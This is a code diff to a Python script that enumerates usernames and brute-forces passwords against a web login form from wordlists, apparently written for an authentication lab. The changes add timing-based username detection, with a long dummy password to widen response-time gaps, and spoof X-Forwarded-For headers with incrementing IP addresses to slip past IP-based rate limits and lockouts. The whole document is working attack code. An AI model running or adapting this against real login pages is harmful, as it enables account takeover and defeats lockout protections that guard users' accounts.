@@ -9,7 +9,7 @@ USERS_LIST = 'authentication/wordlists/usernames.txt'
 PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
-SEARCH_TERM = 'Invalid username or password '
+SEARCH_TERM = 'Invalid username or password.'
 
 def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
     session = requests.Session()
@@ -30,12 +30,16 @@ def enumerate_usernames(target, users_list, user_input_name, password_input_name
     params[password_input_name] = 'password'
     failed_response = session.post(target, params, timeout=timeout)
     potential_usernames = list()
+    usernames_times = list()
+    octet = 1
 
     for username in usernames:
         params[user_input_name] = username
-        params[password_input_name] = 'password'
+        params[password_input_name] = 'password123456789!@#$%&_+9876543210'
 
-        test_response = session.post(target, params, timeout=timeout)
+        test_response = session.post(target, params, headers={'X-Forwarded-For': '192.54.215.' + str(octet)}, timeout=timeout)
+        usernames_times.append((username, test_response.elapsed.total_seconds() * 1000))
+        octet += 1
 
         if test_response.status_code != failed_response.status_code:
             potential_usernames.append(username)
@@ -49,6 +53,15 @@ def enumerate_usernames(target, users_list, user_input_name, password_input_name
         else:
             print(f'No variance for username: {username}')
 
+    usernames_times.sort(key=lambda usr_time: usr_time[1], reverse=True)
+
+    for i in range(1,len(usernames_times)):
+        if (usernames_times[i - 1][1] - usernames_times[i][1]) >= 30:
+            for n in range(i, 0, -1):
+                potential_usernames.append(usernames_times[n - 1][0])
+                print(f'Large time-based difference for username: {usernames_times[n - 1][0]}')
+        break
+    
     print('\nPotential Usernames:')
     
     for potential_username in potential_usernames:
@@ -76,6 +89,7 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
     data[password_input_name] = 'password'
     failed_response = session.post(target, data, timeout=timeout)
     potential_credentials = list()
+    octet = 1
 
     for password in passwords:
         data[password_input_name] = password
@@ -83,7 +97,8 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
         for username in usernames:
             data[user_input_name] = username
 
-        test_response = session.post(target, data, timeout=timeout)
+        test_response = session.post(target, data, headers={'X-Forwarded-For': '192.54.215.' + str(octet)}, timeout=timeout)
+        octet += 1
 
         if test_response.status_code != failed_response.status_code:
             potential_credentials.append({'user': username, 'pwd': password})
@@ -128,10 +143,10 @@ def search_tree(content, term):
     return tree.xpath(f'.//*[text()=\'{term}\']')
 
 if __name__ == '__main__':
-    #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT)
+    #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT)
     enumerate_password(
         TARGET,
-        enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT),
+        enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT),
         PASSWORD_LIST,
         USER_INPUT_NAME,
         PASSWORD_INPUT_NAME,
